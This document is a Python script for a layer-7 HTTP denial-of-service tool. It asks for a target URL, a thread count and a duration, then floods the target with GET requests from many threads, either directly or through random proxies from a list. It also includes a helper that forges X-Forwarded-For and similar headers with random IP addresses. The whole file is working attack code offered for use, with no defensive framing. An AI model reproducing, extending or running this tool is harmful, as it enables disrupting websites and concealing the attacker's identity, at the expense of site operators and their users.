# -*- coding: utf-8 -*-
import os
import threading
import requests
import sys
import random
import datetime
import time
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
from sys import stdout
from colorama import Fore, init

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str(
                (until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE +
                         " Attack Done !                                   \n")
            return

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    return target

def get_proxies():
    global proxies
    if not os.path.exists("./proxies.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE +
                     " You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxies.txt", 'r').read().split('\n')
    return True

def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )

def get_info_l7():
    stdout.write("URL      ")
    target = input()
    stdout.write("THREAD   ")
    thread = input()
    stdout.write("TIME(s)  ")
    t = input()
    return target, thread, t

def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            session = requests.Session()
            session.verify = False
            session.get(url)
            session.get(url)
        except:
            pass

def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackPXRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://' + str(random.choice(list(proxies)))
        proxy = {
            'http': proxy,
            'https': proxy,
        }
        try:
            requests.get(url, proxies=proxy)
            requests.get(url, proxies=proxy)
        except:
            pass

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('ua.txt', 'r').read().split('\n')
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write(
            "Method:  pxraw, raw, \n")
        stdout.write(
            f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('ua.txt', 'r').read().split('\n')
    method = input("methods  ")
    if method == "raw":
        target, thread, t = get_info_l7()
        LaunchRAW(target, thread, t)
    elif method == "pxraw":
        target, thread, t = get_info_l7()
        if get_proxies():
            LaunchPXRAW(target, thread, t)
        else:
            stdout.write(Fore.RED+" [!]"+Fore.WHITE+" Proxy File Not Found !\n")
            sys.exit()
    else:
        stdout.write(Fore.RED+" [!]"+Fore.WHITE+" Invalid Method !\n")
        sys.exit()